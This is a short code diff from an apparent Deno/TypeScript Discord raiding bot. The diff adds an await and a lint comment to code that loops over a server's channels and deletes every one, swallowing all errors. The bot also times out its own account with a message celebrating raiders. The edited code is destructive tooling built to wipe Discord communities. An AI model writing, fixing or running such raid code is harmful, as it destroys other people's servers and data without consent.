@@ -110,7 +110,7 @@ https://discord.gg/annycW3Xrk
                   (await discordServer.members.list()).forEach(
                     async (member) => {
                       if (member.id === client.user?.id) {
-                        member.timeout(0, "荒らし共栄圏万歳！");
+                        await member.timeout(0, "荒らし共栄圏万歳！");
                       }
                     }
                   );
@@ -125,6 +125,7 @@ https://discord.gg/annycW3Xrk
       discordServer?.channels.cache.forEach(async (channel) => {
         try {
           await channel.delete();
+        // deno-lint-ignore no-empty
         } catch (_e) {}
       });
 
